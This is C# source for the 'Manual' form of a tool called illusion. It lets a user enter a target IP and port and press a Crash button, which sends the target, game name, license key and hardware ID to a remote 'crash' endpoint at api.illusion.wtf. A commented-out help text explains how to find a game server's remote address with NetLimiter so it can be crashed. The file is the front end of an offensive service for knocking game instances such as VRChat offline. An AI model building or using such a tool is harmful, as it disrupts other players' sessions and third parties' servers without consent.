using illusion_dc.security;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace illusion_dc.manual
{
    public partial class Manual : Form
    {
        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn
       (
           int nLeftRect,     // x-coordinate of upper-left corner
           int nTopRect,      // y-coordinate of upper-left corner
           int nRightRect,    // x-coordinate of lower-right corner
           int nBottomRect,   // y-coordinate of lower-right corner
           int nWidthEllipse, // width of ellipse
           int nHeightEllipse // height of ellipse
       );
        public Manual()
        {
            InitializeComponent();
            this.FormBorderStyle = FormBorderStyle.None;
            Region = System.Drawing.Region.FromHrgn(CreateRoundRectRgn(0, 0, Width, Height, 15, 15));
            if(MainForm.proccessname == "vrchat")
            {
                PortTextBox.Text = "5056";
            }
        }
        private Point _mouseLoc;
        private void Manual_MouseDown(object sender, MouseEventArgs e)
        {
            _mouseLoc = e.Location;

        }

        private void Manual_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                int dx = e.Location.X - _mouseLoc.X;
                int dy = e.Location.Y - _mouseLoc.Y;
                this.Location = new Point(this.Location.X + dx, this.Location.Y + dy);
            }
        }

        private void ExitButton_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void CrashButton_Click(object sender, EventArgs e)
        {
            if (IpTextBox.Text.StartsWith("216") && MainForm.proccessname == "vrchat")
            {
                MessageBox.Show("This instance is not vulnurable!", "illusion");
                return;
            }
            WebClient client = new WebClient();
            try
            {
                string response = client.DownloadString($"https://api.illusion.wtf/endpoints/crash/?key={Program.key}&hwid={hwid.GenerateHWID()}&host={IpTextBox.Text}&port={PortTextBox.Text}&game={MainForm.proccessname}&version={Program.version}&timecheck={security.timepin.GetPin()}");
                dynamic json = JsonConvert.DeserializeObject(response);
                if (json.status == false)
                {
                    MessageBox.Show($"{json.message}", "illusion");
                    return;
                }

                MessageBox.Show($"{json.message}", "illusion");


            }
            catch(Exception ex)
            {
                MessageBox.Show($"Failed to send crash request: {ex}", "illusion");
            }
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            Process.Start("https://illusion.wtf/tutorial.mp4");
            // MessageBox.Show("1. Download Netlimiter from https://netlimiter.com/\n2. Open Netlimiter and find the game you're playing in the list\n3. Click the drop down next to the game in netlimiter\n4. Look for the IP using the most DL/UL Rate & Click it\n5. Copy the remote address and remote port into illusion\n\nIf you need more help make a ticket in our discord server!", "illusion");
        }
    }
}
